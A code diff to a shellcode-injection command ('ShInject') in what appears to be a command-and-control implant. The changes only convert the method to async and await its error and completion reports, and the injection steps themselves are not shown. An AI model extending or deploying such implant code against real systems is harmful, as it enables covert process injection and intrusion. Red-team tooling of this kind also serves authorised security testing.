@@ -1,6 +1,6 @@
 ﻿using System;
 using System.Threading;
-
+using System.Threading.Tasks;
 using DInvoke.Data;
 
 namespace Drone.Commands;
@@ -13,7 +13,7 @@ public class ShInject : DroneCommand
     public override byte Command => 0x4A;
     public override bool Threaded => false;
     
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         // parse target pid
         var pid = uint.Parse(task.Arguments[0]);
@@ -29,7 +29,7 @@ public class ShInject : DroneCommand
 
         if (status != Native.NTSTATUS.Success)
         {
-            Drone.SendTaskError(task.Id, status.ToString());
+            await Drone.SendTaskError(task.Id, status.ToString());
             return;
         }
 
@@ -39,7 +39,7 @@ public class ShInject : DroneCommand
 
         if (status != Native.NTSTATUS.Success)
         {
-            Drone.SendTaskError(task.Id, status.ToString());
+            await Drone.SendTaskError(task.Id, status.ToString());
             CloseHandle(hProcess);
             return;
         }
@@ -49,7 +49,7 @@ public class ShInject : DroneCommand
         
         if (status != Native.NTSTATUS.Success)
         {
-            Drone.SendTaskError(task.Id, status.ToString());
+            await Drone.SendTaskError(task.Id, status.ToString());
             CloseHandle(hProcess);
             return;
         }
@@ -60,7 +60,7 @@ public class ShInject : DroneCommand
         
         if (status != Native.NTSTATUS.Success)
         {
-            Drone.SendTaskError(task.Id, status.ToString());
+            await Drone.SendTaskError(task.Id, status.ToString());
             CloseHandle(hProcess);
             return;
         }
@@ -71,7 +71,7 @@ public class ShInject : DroneCommand
 
         if (status != Native.NTSTATUS.Success)
         {
-            Drone.SendTaskError(task.Id, status.ToString());
+            await Drone.SendTaskError(task.Id, status.ToString());
             CloseHandle(hProcess);
             return;
         }
@@ -80,6 +80,6 @@ public class ShInject : DroneCommand
         CloseHandle(hProcess);
         CloseHandle(hThread);
         
-        Drone.SendTaskComplete(task.Id);
+        await Drone.SendTaskComplete(task.Id);
     }
 }
